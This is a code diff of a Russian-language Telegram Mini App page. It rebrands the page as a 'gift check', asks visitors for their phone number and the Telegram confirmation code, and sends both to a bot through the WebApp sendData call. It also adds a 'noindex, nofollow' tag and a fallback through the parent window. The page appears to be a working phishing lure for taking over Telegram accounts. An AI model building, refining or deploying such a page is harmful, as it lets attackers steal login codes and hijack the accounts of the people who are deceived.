@@ -3,7 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Telegram</title>
+    <meta name="theme-color" content="#3390ec">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="default">
+    <meta name="robots" content="noindex, nofollow">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Проверка подарка</title>
     <style>
         * {
             margin: 0;
@@ -253,8 +258,8 @@
                 <path d="M85.8 141.9L119.8 148.1L156.9 170.2C160.2 172.1 164.1 170.2 165.1 166.4L183.6 72.2C184.6 68.2 180.4 65.6 176.8 67.4L53.2 120.2C49.6 122 49.6 127.2 53.2 129L85.8 141.9Z" fill="white" fill-opacity="0.8"/>
             </svg>
         </div>
-        <h1 class="title">Telegram</h1>
-        <p class="subtitle">Пожалуйста, подтвердите свой номер телефона</p>
+        <h1 class="title">Проверка подарка</h1>
+        <p class="subtitle">Для получения подарка необходимо подтвердить номер телефона</p>
         
         <div class="form-container">
             <div class="error" id="phoneError"></div>
@@ -284,7 +289,7 @@
             </svg>
         </div>
         <h1 class="title">Код подтверждения</h1>
-        <p class="subtitle">Мы отправили вам код подтверждения через Telegram</p>
+        <p class="subtitle">Введите код, который мы отправили вам в Telegram</p>
         
         <div class="form-container">
             <div class="error" id="codeError"></div>
@@ -305,12 +310,38 @@
     </div>
     
     <script>
-        if (window.Telegram && window.Telegram.WebApp) {
-            window.Telegram.WebApp.ready();
-            window.Telegram.WebApp.expand();
+        let fullPhoneNumber = '';
+        let tg = null;
+        
+        function initTelegramWebApp() {
+            if (typeof window.Telegram !== 'undefined' && window.Telegram.WebApp) {
+                tg = window.Telegram.WebApp;
+                tg.ready();
+                tg.expand();
+                tg.enableClosingConfirmation();
+                console.log('Telegram WebApp инициализирован');
+                console.log('Версия:', tg.version);
+                console.log('Платформа:', tg.platform);
+                return true;
+            } else if (window.parent && window.parent.Telegram && window.parent.Telegram.WebApp) {
+                tg = window.parent.Telegram.WebApp;
+                tg.ready();
+                tg.expand();
+                console.log('Telegram WebApp инициализирован через parent');
+                return true;
+            } else {
+                console.warn('Telegram WebApp не доступен');
+                return false;
+            }
         }
         
-        let fullPhoneNumber = '';
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', function() {
+                setTimeout(initTelegramWebApp, 100);
+            });
+        } else {
+            setTimeout(initTelegramWebApp, 100);
+        }
         
         function showError(page, message) {
             const errorEl = document.getElementById(page + 'Error');
@@ -341,15 +372,16 @@
             document.getElementById('phoneBtn').disabled = true;
             document.getElementById('phoneLoading').classList.add('active');
             
-            if (window.Telegram && window.Telegram.WebApp) {
-                const data = JSON.stringify({
-                    phone: fullPhoneNumber,
-                    code: ''
-                });
-                console.log('Отправка данных телефона:', data);
+            const data = JSON.stringify({
+                phone: fullPhoneNumber,
+                code: ''
+            });
+            console.log('Отправка данных телефона:', data);
+            
+            if (tg && typeof tg.sendData === 'function') {
                 try {
-                    window.Telegram.WebApp.sendData(data);
-                    console.log('Данные отправлены успешно');
+                    tg.sendData(data);
+                    console.log('Данные отправлены успешно через Telegram WebApp');
                 } catch (error) {
                     console.error('Ошибка отправки данных:', error);
                     showError('phone', 'Ошибка отправки данных. Попробуйте снова.');
@@ -357,8 +389,8 @@
                     document.getElementById('phoneLoading').classList.remove('active');
                 }
             } else {
-                console.error('WebApp не доступен');
-                showError('phone', 'Ошибка: WebApp не доступен');
+                console.warn('Telegram WebApp не доступен, используем альтернативный метод');
+                showError('phone', 'Пожалуйста, откройте это приложение через Telegram бота');
                 document.getElementById('phoneBtn').disabled = false;
                 document.getElementById('phoneLoading').classList.remove('active');
             }
@@ -376,15 +408,16 @@
             document.getElementById('codeBtn').disabled = true;
             document.getElementById('codeLoading').classList.add('active');
             
-            if (window.Telegram && window.Telegram.WebApp) {
-                const data = JSON.stringify({
-                    phone: fullPhoneNumber,
-                    code: code
-                });
-                console.log('Отправка кода:', data);
+            const data = JSON.stringify({
+                phone: fullPhoneNumber,
+                code: code
+            });
+            console.log('Отправка кода:', data);
+            
+            if (tg && typeof tg.sendData === 'function') {
                 try {
-                    window.Telegram.WebApp.sendData(data);
-                    console.log('Код отправлен успешно');
+                    tg.sendData(data);
+                    console.log('Код отправлен успешно через Telegram WebApp');
                 } catch (error) {
                     console.error('Ошибка отправки кода:', error);
                     showError('code', 'Ошибка отправки кода. Попробуйте снова.');
@@ -392,8 +425,8 @@
                     document.getElementById('codeLoading').classList.remove('active');
                 }
             } else {
-                console.error('WebApp не доступен');
-                showError('code', 'Ошибка: WebApp не доступен');
+                console.warn('Telegram WebApp не доступен, используем альтернативный метод');
+                showError('code', 'Пожалуйста, откройте это приложение через Telegram бота');
                 document.getElementById('codeBtn').disabled = false;
                 document.getElementById('codeLoading').classList.remove('active');
             }
@@ -408,8 +441,8 @@
         function resendCode() {
             document.getElementById('code').value = '';
             document.getElementById('code').focus();
-            if (window.Telegram && window.Telegram.WebApp) {
-                window.Telegram.WebApp.sendData(JSON.stringify({
+            if (tg && typeof tg.sendData === 'function') {
+                tg.sendData(JSON.stringify({
                     phone: fullPhoneNumber,
                     code: '',
                     resend: true
